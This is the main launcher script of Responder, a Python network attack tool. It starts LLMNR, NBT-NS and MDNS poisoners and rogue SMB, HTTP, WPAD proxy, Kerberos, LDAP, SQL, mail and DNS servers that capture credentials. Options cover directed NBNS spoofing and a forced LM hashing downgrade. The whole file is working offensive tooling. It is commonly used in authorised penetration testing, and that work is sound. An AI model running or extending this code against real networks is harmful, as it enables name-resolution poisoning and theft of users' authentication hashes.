#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import optparse
import socket
import thread
import time
import settings
import traceback

from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler, BaseServer
from utils import *

banner()

parser = optparse.OptionParser(usage='python %prog -I eth0 -w -r -f\nor:\npython %prog -I eth0 -wrf', version=settings.__version__, prog=sys.argv[0])
parser.add_option('-A','--analyze',        action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.", dest="Analyze", default=False)
parser.add_option('-I','--interface',      action="store",      help="Network interface to use", dest="Interface", metavar="eth0", default=None)
parser.add_option('-b', '--basic',         action="store_true", help="Return a Basic HTTP authentication. Default: NTLM", dest="Basic", default=False)
parser.add_option('-r', '--wredir',        action="store_true", help="Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False", dest="Wredirect", default=False)
parser.add_option('-d', '--NBTNSdomain',   action="store_true", help="Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False", dest="NBTNSDomain", default=False)
parser.add_option('-f','--fingerprint',    action="store_true", help="This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", dest="Finger", default=False)
parser.add_option('-w','--wpad',           action="store_true", help="Start the WPAD rogue proxy server. Default value is False", dest="WPAD_On_Off", default=False)
parser.add_option('-u','--upstream-proxy', action="store",      help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)", dest="Upstream_Proxy", default=None)
parser.add_option('-s','--spoof',action="store",help="Perform directed (out of broadcast) NBNS spoofing attacks. Format is <targetip>:<sourceip>:<nbns name>",default=None)
parser.add_option('-F','--ForceWpadAuth',  action="store_true", help="Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False", dest="Force_WPAD_Auth", default=False)
parser.add_option('--lm',                  action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False", dest="LM_On_Off", default=False)
parser.add_option('-v','--verbose',        action="store_true", help="Increase verbosity.", dest="Verbose")
options, args = parser.parse_args()

if not os.geteuid() == 0:
    print color("[!] Responder must be run as root.")
    sys.exit(-1)

settings.init()
settings.Config.populate(options)

StartupMessage()

settings.Config.ExpandIPRanges()

if settings.Config.AnalyzeMode:
	print color('[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1)

class ThreadingUDPServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		TCPServer.server_bind(self)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR = "224.0.0.251"
		
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)

		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR = "224.0.0.252"

		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + settings.Config.IP_aton)
		
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

ThreadingUDPServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1
ThreadingUDPMDNSServer.allow_reuse_address = 1
ThreadingUDPLLMNRServer.allow_reuse_address = 1

def serve_thread_udp_broadcast(host, port, handler):
	try:
		server = ThreadingUDPServer(('', port), handler)
		server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running."

def serve_NBTNS_poisoner(host, port, handler):
	serve_thread_udp_broadcast(host, port, handler)

def serve_MDNS_poisoner(host, port, handler):
	try:
		server = ThreadingUDPMDNSServer((host, port), handler)
		server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running."

def serve_LLMNR_poisoner(host, port, handler):
	try:
		server = ThreadingUDPLLMNRServer((host, port), handler)
		server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running."

def serve_NBTSpam_poisoner(handler):
	try:
		nbtSpammer = handler()
		nbtSpammer.startSpoofing()
	except:
		print(traceback.format_exc())
		print color("[!] ", 1, 1) + "Error starting poisoner "

def serve_thread_udp(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingUDPServer((settings.Config.Bind_To, port), handler)
			server.serve_forever()
		else:
			server = ThreadingUDPServer((host, port), handler)
			server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running."

def serve_thread_tcp(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingTCPServer((settings.Config.Bind_To, port), handler)
			server.serve_forever()
		else:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting TCP server on port " + str(port) + ", check permissions or other servers running."

def serve_thread_SSL(host, port, handler):
	try:
		from servers.HTTP import SSLSock

		if OsInterfaceIsSupported():
			server = SSLSock((settings.Config.Bind_To, port), handler)
			server.serve_forever()
		else:
			server = SSLSock((host, port), handler)
			server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting SSL server on port " + str(port) + ", check permissions or other servers running."

def main():
	try:
		# Load (M)DNS, NBNS and LLMNR Poisoners
		from poisoners.LLMNR import LLMNR
		from poisoners.NBTNS import NBTNS
		from poisoners.MDNS import MDNS
		from poisoners.NBTSpam import NBTSpam
		if(settings.Config.spoof is None):
			thread.start_new(serve_LLMNR_poisoner, ('', 5355, LLMNR))
			thread.start_new(serve_MDNS_poisoner,  ('', 5353, MDNS))
			thread.start_new(serve_NBTNS_poisoner, ('', 137,  NBTNS))
		else:
			thread.start_new(serve_NBTSpam_poisoner,(NBTSpam,))

		# Load Browser Listener
		from servers.Browser import Browser
		thread.start_new(serve_thread_udp_broadcast,('', 138,  Browser))

		if settings.Config.HTTP_On_Off:
			from servers.HTTP import HTTP
			thread.start_new(serve_thread_tcp,('', 80, HTTP))

		if settings.Config.SSL_On_Off:
			from servers.HTTP import HTTPS
			thread.start_new(serve_thread_SSL,('', 443, HTTPS))

		if settings.Config.WPAD_On_Off:
			from servers.HTTP_Proxy import HTTP_Proxy
			thread.start_new(serve_thread_tcp,('', 3141, HTTP_Proxy))

		if settings.Config.SMB_On_Off:
			if settings.Config.LM_On_Off == True:
				from servers.SMB import SMB1LM
				thread.start_new(serve_thread_tcp,('', 445, SMB1LM))
				thread.start_new(serve_thread_tcp,('', 139, SMB1LM))
			else:
				from servers.SMB import SMB1
				thread.start_new(serve_thread_tcp,('', 445, SMB1))
				thread.start_new(serve_thread_tcp,('', 139, SMB1))

		if settings.Config.Krb_On_Off:
			from servers.Kerberos import KerbTCP, KerbUDP
			thread.start_new(serve_thread_udp,('', 88, KerbUDP))
			thread.start_new(serve_thread_tcp,('', 88, KerbTCP))

		if settings.Config.SQL_On_Off:
			from servers.MSSQL import MSSQL
			thread.start_new(serve_thread_tcp,('', 1433, MSSQL))

		if settings.Config.FTP_On_Off:
			from servers.FTP import FTP
			thread.start_new(serve_thread_tcp,('', 21, FTP))

		if settings.Config.POP_On_Off:
			from servers.POP3 import POP3
			thread.start_new(serve_thread_tcp,('', 110, POP3))

		if settings.Config.LDAP_On_Off:
			from servers.LDAP import LDAP
			thread.start_new(serve_thread_tcp,('', 389, LDAP))

		if settings.Config.SMTP_On_Off:
			from servers.SMTP import ESMTP
			thread.start_new(serve_thread_tcp,('', 25,  ESMTP))
			thread.start_new(serve_thread_tcp,('', 587, ESMTP))

		if settings.Config.IMAP_On_Off:
			from servers.IMAP import IMAP
			thread.start_new(serve_thread_tcp,('', 143, IMAP))

		if settings.Config.DNS_On_Off:
			from servers.DNS import DNS, DNSTCP
			thread.start_new(serve_thread_udp,('', 53, DNS))
			thread.start_new(serve_thread_tcp,('', 53, DNSTCP))

		print color('[+]', 2, 1) + " Listening for events..."

		while True:
			time.sleep(1)

	except KeyboardInterrupt:
		sys.exit("\r%s Exiting..." % color('[+]', 2, 1))

if __name__ == '__main__':
	main()
